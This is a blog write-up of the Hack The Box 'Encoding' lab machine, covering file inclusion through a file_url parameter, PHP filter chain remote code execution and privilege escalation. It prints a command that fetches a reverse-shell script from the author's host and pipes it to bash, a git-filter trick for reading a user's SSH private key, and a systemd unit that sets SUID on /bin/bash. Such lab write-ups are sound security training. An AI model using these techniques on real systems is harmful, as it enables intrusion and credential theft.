---
title: "Hack The Box - Encoding [Medium]"
date: 2023-02-17T02:01:27+03:00
draft: true
description: 
---

This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.

You will find the following vulnerabilities:
	- [Local File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
	- [Command Injection or RCE](https://book.hacktricks.xyz/pentesting-web/command-injection)

# Flag 1

I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on. But the interesting part was this:

>If required, you can specify a URL that will return data to be converted with the `file_url` parameter. This can be done for both string and integer convertions.

That quickly reminded me of local/remote file inclusion, and so I've tried it with the following payload:

```python
json_data = {
	'action': 'b64encode',
	'file_url' : 'file:///etc/passwd'
}
```

That gave me the contents of the `/etc/passwd` file encoded in base64, I used `base64 -d` to decode it. From there I saw another user `svc`.

I was also curious what's in the `/var/www/` directory, so I began enumerating the directory.

I ran `ffuf` on the main website `haxtables.htb/FUZZ` also ran `ffuf` for subdomain discovery.

```
$ ffuf -w $disc_wc/raft-small-directories-lowercase.txt -u http://haxtables.htb/FUZZ

$ ffuf -w $disc_wc/common.txt -u http://haxtables.htb/ -H "Host: FUZZ.haxtables.htb" -fs 1999
```

With those I found `api, image` subdomains, so I inspected them via the LFI vulnerability `/var/www/image/index.php` to check whether this application uses some kind of database or eventually some useful things. I found that `image` domain contains a git repository (through `git_status, git_log, git_commit` functions in `/var/www/image/index.php -> uitls.php`). This led me to believe that I could use that to gain user privileges later on. I decided to dump the repository and bear with me here I did it in the most ghetto way possible, through a local server that acted as a proxy for `gitdumper.sh`

```python
import requests
import json
from flask import Flask
import base64


app = Flask(__name__)


@app.route('/<path:filepath>')
def index(filepath):
    json_data = {
        'action': 'b64encode',
        'file_url' : "file://" + "/var/www/image/" + filepath
    }
    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
    d = json.loads(response.text.strip())
    res = base64.b64decode(d["data"])
    return res
```

```
$ gitdumper.sh http://localhost:5000/.git/ ./dump_repo
```

Then I used the `git ls-files` to figure what other files are in the folder.

```
$ git ls-files
actions/action_handler.php
actions/image2pdf.php
assets/img/forestbridge.jpg
includes/coming_soon.html
index.php
scripts/git-commit.sh
utils.php
```

I saw the `actions/action_handler.php` source code by using the LFI vulnerability.

```php
<?php
include_once 'utils.php';
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page); # <-- BruhMoment
} else {
    echo jsonify(['message' => 'No page specified!']);
}
?>
```

It is pretty obvious that this code is vulnerable to LFI, and I can use it to gain a reverse shell through PHP Filters. But I can't access this page directly, so I can use the first LFI to execute this LFI to execute the PHP filters RCE... 

And this is me figuring out this after 2 days of trying...

![rwojak](/random/rwojak.jpg)

I generated a payload with the [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator).

```
$ python3 php_filter_chain_generator.py --chain '<?= `curl http://myIp/rev_bash_norm.sh|bash` ;?>'
```

And I hosted a web server containing the `rev_bash_norm.sh`, I won't show the full monstrosity of the generated filter request but in the end it looked like this:

```http
POST /v3/tools/string/index.php HTTP/1.1
Host: api.haxtables.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 12920

{
    "action": "b64encode",
    "file_url" : "email@image.haxtables.htb/actions/action_handler.php?page=php://filter/<bruhmoment>"
}
```

Whenever executed, this request will spawn a reverse shell.

The `www-data` to `svc(user)` was honestly too much for me, and I turned to some write-ups. 

> The next section is what I've tried and failed, feel free to skip it.

`<i-tried-this>`
I was pretty sure that it has something to do with the `git` scripts and I only had `rwxr-xr-x` permissions of the `.git` folder, so I've tried to simulate file edit by using the dumped repository and change all the files in the `.git` directory on the server. 

And that was kinda the right approach, but I didn't notice the `ssh` keys that I needed to retrieve, so I was hard stuck at this, and I went to some write-ups. 

`</i-tried-this>`

Check [gatogamer1155](https://gatogamer1155.github.io/htb/encoding/)'s write-up for gaining access to the user and retrieve the first flag.

TLDR: 
* Creates an executable file `/tmp/readkey` with a content that reads the 
`~/.ssh/id_rsa` file and saves it to file. 
- Creates a git attributes file with a new filter called indent:  `'*.php filter=indent'` 
- Sets the Git configuration `filter.indent.clean` to the command `/tmp/readkey`. This tells Git to apply the `indent` filter to files ending in `.php` and to use the `/tmp/readkey` command to process the filter.
- Execute the `/var/www/image/scripts/git-commit.sh` with `sudo -u svc`
- The filter is then applied, and you can read the private key file.

> **NOTE:** Make sure that whenever you save the private key on your machine add an empty line at the end of the file otherwise you will get an error!

After logging with the `svc` user, you can read the first flag.

# Flag 2

Honestly, this was too easy, but I didn't mind it since I spent too much time doing this box. 

Executing the `sudo -l` would give you the executables that you can execute as root.

```
(root) NOPASSWD: /usr/bin/systemctl restart *
```

I had to create a service that looks like that and place it under `/etc/systemd/system/syl.service`

```toml
[Service]
Type=simple
ExecStart=chmod +s /bin/bash
[Install]
WantedBy=multi-user.target
```

And simply execute:

```
$ sudo /usr/bin/systemctl restart syl
$ bash -p
bash-5.1# cat root/root.txt
. . .
```